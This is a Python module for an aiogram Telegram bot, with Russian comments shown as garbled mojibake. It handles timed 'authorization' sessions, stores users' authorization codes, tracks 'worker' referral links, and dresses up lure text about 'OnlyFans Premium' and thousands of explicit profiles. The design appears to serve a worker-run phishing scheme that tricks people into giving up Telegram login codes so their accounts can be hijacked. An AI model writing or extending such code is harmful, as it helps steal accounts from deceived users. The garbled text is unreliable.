import os
import asyncio
import logging
import requests
from aiogram import Bot
from datetime import datetime

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logger = logging.getLogger(__name__)

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ –Ω–∞—á–∞–ª–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
auth_start_times = {}
# –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π (–∫–æ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏)
user_auth_data = {}
# –°–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤ (–±—É–¥–µ—Ç –∑–∞–≥—Ä—É–∂–µ–Ω –∏–∑ .env)
admin_ids = []
# –§–ª–∞–≥ –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –∞–¥–º–∏–Ω–æ–≤
admin_notifications = True

# –°—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö —Ä–∞–±–æ—Ç–Ω–∏–∫–æ–≤ –∏ –∏—Ö –ø—Ä–æ—Ñ–∏–ª–µ–π
worker_profiles = {}  # user_id: profile_data
referral_links = {}   # ref_code: worker_id
referred_users = {}   # user_id: referrer_id

# –ò–º—è –±–æ—Ç–∞ (–±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –≤—ã–∑–æ–≤–µ generate_ref_link)
bot_username = None

# –¢–∞–π–º–∞—É—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)
AUTH_TIMEOUT = 300  # 5 –º–∏–Ω—É—Ç

async def check_auth_timeout(user_id, bot):
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç —Ç–∞–π–º–∞—É—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏ –æ—Ç–º–µ–Ω—è–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å, –µ—Å–ª–∏ –≤—Ä–µ–º—è –≤—ã—à–ª–æ"""
    await asyncio.sleep(AUTH_TIMEOUT)
    if user_id in auth_start_times:
        now = datetime.now()
        start_time = auth_start_times[user_id]
        if (now - start_time).total_seconds() >= AUTH_TIMEOUT:
            # –£–¥–∞–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
            if user_id in auth_start_times:
                del auth_start_times[user_id]
            if user_id in user_auth_data:
                del user_auth_data[user_id]
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
            await bot.send_message(
                user_id, 
                "*‚ö†Ô∏è –í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ*\n\n*–ü—Ä–æ—Ü–µ—Å—Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –æ—Ç–º–µ–Ω–µ–Ω. –î–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /start*",
                parse_mode="Markdown"
            )

def format_with_emoji(text):
    """–î–µ–ª–∞–µ—Ç —Ç–µ–∫—Å—Ç –∂–∏—Ä–Ω—ã–º –∏ –¥–æ–±–∞–≤–ª—è–µ—Ç —Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ —ç–º–æ–¥–∑–∏ (–±–µ–∑ –ø–µ—Ä–µ–∏–∑–±—ã—Ç–∫–∞)"""
    emoji_text = text
    
    # –î–æ–±–∞–≤–ª—è–µ–º –∫–ª—é—á–µ–≤—ã–µ —ç–º–æ–¥–∑–∏ (–Ω–æ –±–æ–ª–µ–µ —Å–¥–µ—Ä–∂–∞–Ω–Ω–æ)
    emoji_text = emoji_text.replace("OnlyFans Premium", "üî• *OnlyFans Premium*")
    emoji_text = emoji_text.replace("10.000 –¥–µ–≤—É—à–µ–∫", "*10.000+* –¥–µ–≤—É—à–µ–∫ üë©‚Äçü¶∞")
    emoji_text = emoji_text.replace("–º–æ—Ä–µ –æ—Ç–∫—Ä–æ–≤–µ–Ω–Ω—ã—Ö –∞–Ω–∫–µ—Ç", "–º–æ—Ä–µ –æ—Ç–∫—Ä–æ–≤–µ–Ω–Ω—ã—Ö –∞–Ω–∫–µ—Ç üì∏")
    emoji_text = emoji_text.replace("–∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", "–∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è üìù")
    emoji_text = emoji_text.replace("–í–ù–ò–ú–ê–ù–ò–ï:", "‚ö†Ô∏è *–í–ù–ò–ú–ê–ù–ò–ï:*")
    emoji_text = emoji_text.replace("–ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –µ–≥–æ", "–ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –µ–≥–æ üîÑ")
    
    # –°–¥–µ–ª–∞—Ç—å –≤–µ—Å—å —Ç–µ–∫—Å—Ç –∂–∏—Ä–Ω—ã–º
    lines = emoji_text.split('\n')
    for i, line in enumerate(lines):
        if line.strip() and not (line.strip().startswith('*') and line.strip().endswith('*')):
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥–æ–µ —Å–ª–æ–≤–æ –≤ —Å—Ç—Ä–æ–∫–µ
            words = line.split()
            for j, word in enumerate(words):
                if '*' not in word:
                    words[j] = f"*{word}*"
            lines[i] = ' '.join(words)
    
    return '\n'.join(lines)

def generate_ref_link(worker_id):
    """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—É—é —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É –¥–ª—è —Ä–∞–±–æ—Ç–Ω–∏–∫–∞"""
    global bot_username
    
    # –ï—Å–ª–∏ –∏–º—è –±–æ—Ç–∞ –µ—â–µ –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ, –ø–æ–ª—É—á–∞–µ–º –µ–≥–æ –∏–∑ API
    if not bot_username:
        try:
            # –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
            bot_token = os.getenv('BOT_TOKEN')
            if bot_token:
                # –î–µ–ª–∞–µ–º –∑–∞–ø—Ä–æ—Å –∫ API Telegram, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–æ—Ç–µ
                response = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe")
                if response.status_code == 200:
                    data = response.json()
                    if data["ok"]:
                        bot_username = data["result"]["username"]
                        logger.info(f"–ü–æ–ª—É—á–µ–Ω–æ –∏–º—è –±–æ—Ç–∞: {bot_username}")
                    else:
                        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–º–µ–Ω–∏ –±–æ—Ç–∞: {data}")
                        bot_username = "zerkalosirdebarbot"  # –ó–∞–ø–∞—Å–Ω–æ–π –≤–∞—Ä–∏–∞–Ω—Ç, –µ—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å
                else:
                    logger.error(f"–û—à–∏–±–∫–∞ HTTP –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –∫ API: {response.status_code}")
                    bot_username = "zerkalosirdebarbot"  # –ó–∞–ø–∞—Å–Ω–æ–π –≤–∞—Ä–∏–∞–Ω—Ç, –µ—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å
            else:
                logger.error("–¢–æ–∫–µ–Ω –±–æ—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è")
                bot_username = "zerkalosirdebarbot"  # –ó–∞–ø–∞—Å–Ω–æ–π –≤–∞—Ä–∏–∞–Ω—Ç, –µ—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ –∏–º–µ–Ω–∏ –±–æ—Ç–∞: {str(e)}")
            bot_username = "zerkalosirdebarbot"  # –ó–∞–ø–∞—Å–Ω–æ–π –≤–∞—Ä–∏–∞–Ω—Ç, –µ—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å
    
    ref_code = f"ref_{worker_id}"
    referral_links[ref_code] = worker_id
    return f"t.me/{bot_username}?start={ref_code}"

def get_worker_by_ref(ref_code):
    """–ü–æ–ª—É—á–∞–µ—Ç ID —Ä–∞–±–æ—Ç–Ω–∏–∫–∞ –ø–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–º—É –∫–æ–¥—É"""
    return referral_links.get(ref_code) 